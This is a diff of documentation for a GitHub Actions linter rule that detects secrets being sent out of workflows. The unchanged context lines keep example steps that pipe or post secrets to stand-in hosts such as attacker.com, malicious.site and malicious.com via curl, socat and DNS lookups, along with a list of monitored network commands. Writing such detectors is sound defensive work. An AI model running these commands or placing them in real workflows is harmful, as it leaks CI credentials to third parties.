@@ -3,22 +3,24 @@ title: "Secret Exfiltration Rule"
 weight: 44
 ---
 
-### Secret Exfiltration Rule Overview
+# Secret Exfiltration Rule
+
+## Overview
 
 The `secret-exfiltration` rule detects patterns where GitHub Actions secrets may be exfiltrated to external services via network commands. This helps identify potential security vulnerabilities where secrets could be stolen by malicious actors.
 
-### Rule ID
+## Rule ID
 
 `secret-exfiltration`
 
-### Severity Levels
+## Severity Levels
 
 - **Critical**: Network commands that actively send data (e.g., `curl -X POST`, `wget --post-data`) with secrets
 - **High**: Network commands that may expose secrets (e.g., `curl` with secrets in headers, DNS exfiltration)
 
-### Detected Patterns
+## Detected Patterns
 
-#### 1. Direct Secret Exfiltration via HTTP
+### 1. Direct Secret Exfiltration via HTTP
 
 Secrets passed directly to network commands that send data to external URLs:
 
@@ -39,7 +41,7 @@ Secrets passed directly to network commands that send data to external URLs:
       https://malicious.site/exfil
 ```
 
-#### 2. DNS Exfiltration
+### 2. DNS Exfiltration
 
 Secrets embedded in DNS queries for data exfiltration:
 
@@ -54,7 +56,7 @@ Secrets embedded in DNS queries for data exfiltration:
 - run: host ${{ secrets.API_KEY }}.malicious.com
 ```
 
-#### 3. Raw Socket Exfiltration
+### 3. Raw Socket Exfiltration
 
 Secrets piped to low-level network tools:
 
@@ -69,7 +71,7 @@ Secrets piped to low-level network tools:
 - run: echo "${{ secrets.TOKEN }}" | socat - TCP:attacker.com:8080
 ```
 
-#### 4. Environment Variable Leak
+### 4. Environment Variable Leak
 
 Secrets passed via environment variables to network commands:
 
@@ -82,11 +84,11 @@ Secrets passed via environment variables to network commands:
       -d "data=$MY_SECRET"
 ```
 
-### Safe Patterns (Not Flagged)
+## Safe Patterns (Not Flagged)
 
 The rule recognizes legitimate use cases and does NOT flag:
 
-#### Package Publishing
+### Package Publishing
 
 ```yaml
 # GOOD: npm publish
@@ -103,7 +105,7 @@ The rule recognizes legitimate use cases and does NOT flag:
     TWINE_PASSWORD: ${{ secrets.PYPI_TOKEN }}
 ```
 
-#### Cloud CLI Authentication
+### Cloud CLI Authentication
 
 ```yaml
 # GOOD: AWS CLI
@@ -116,7 +118,7 @@ The rule recognizes legitimate use cases and does NOT flag:
 - run: az login --service-principal -u ${{ secrets.AZURE_CLIENT_ID }}
 ```
 
-#### Trusted API Endpoints
+### Trusted API Endpoints
 
 ```yaml
 # GOOD: GitHub API
@@ -133,7 +135,7 @@ The rule recognizes legitimate use cases and does NOT flag:
 - run: codecov -t ${{ secrets.CODECOV_TOKEN }}
 ```
 
-#### Infrastructure Tools
+### Infrastructure Tools
 
 ```yaml
 # GOOD: Terraform
@@ -145,7 +147,7 @@ The rule recognizes legitimate use cases and does NOT flag:
 - run: vault login -method=token token=${{ secrets.VAULT_TOKEN }}
 ```
 
-#### Git Operations
+### Git Operations
 
 ```yaml
 # GOOD: git push
@@ -159,7 +161,7 @@ The rule recognizes legitimate use cases and does NOT flag:
     GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
 ```
 
-### Network Commands Monitored
+## Network Commands Monitored
 
 | Command | Risk Level | Common Data Flags |
 |---------|------------|-------------------|
@@ -172,7 +174,7 @@ The rule recognizes legitimate use cases and does NOT flag:
 | `nslookup` | High | (DNS exfiltration) |
 | `host` | High | (DNS exfiltration) |
 
-### Trusted Domains (Allowlisted)
+## Trusted Domains (Allowlisted)
 
 The following domains are considered trusted and won't trigger alerts:
 
@@ -186,14 +188,14 @@ The following domains are considered trusted and won't trigger alerts:
 - Infrastructure: `app.terraform.io`, `vault.*`, `hashicorp`
 - Artifact Management: `jfrog.io`, `artifactory`, `nexus`, `sonatype.org`
 
-### Why This Rule Matters
+## Why This Rule Matters
 
 1. **Data Theft**: Attackers with write access to workflows can add steps that exfiltrate secrets to their servers
 2. **Supply Chain Attacks**: Compromised dependencies or actions could exfiltrate secrets
 3. **Insider Threats**: Malicious contributors could steal secrets via workflow modifications
 4. **DNS Tunneling**: Even firewalled environments may allow DNS queries, enabling data exfiltration
 
-### Remediation
+## Remediation
 
 1. **Review all network commands** that use secrets
 2. **Verify destination URLs** are trusted and necessary
@@ -202,7 +204,7 @@ The following domains are considered trusted and won't trigger alerts:
 5. **Enable audit logging** to track secret access
 6. **Use OIDC** instead of long-lived credentials where possible
 
-### Example Fix
+## Example Fix
 
 Before (Vulnerable):
 ```yaml
@@ -227,13 +229,13 @@ After (Safe):
       -H "Authorization: Bearer $ANALYTICS_KEY"
 ```
 
-### Related Rules
+## Related Rules
 
 - `secret-exposure`: Detects excessive secret exposure patterns like `toJSON(secrets)`
 - `unmasked-secret-exposure`: Detects derived secrets that aren't automatically masked
 - `credential-rule`: Detects hardcoded credentials in workflows
 
-### References
+## References
 
 - [OWASP Top 10 CI/CD Security Risks](https://owasp.org/www-project-top-10-ci-cd-security-risks/)
 - [GitHub Actions Security Hardening](https://docs.github.com/en/actions/security-guides/security-hardening-for-github-actions)
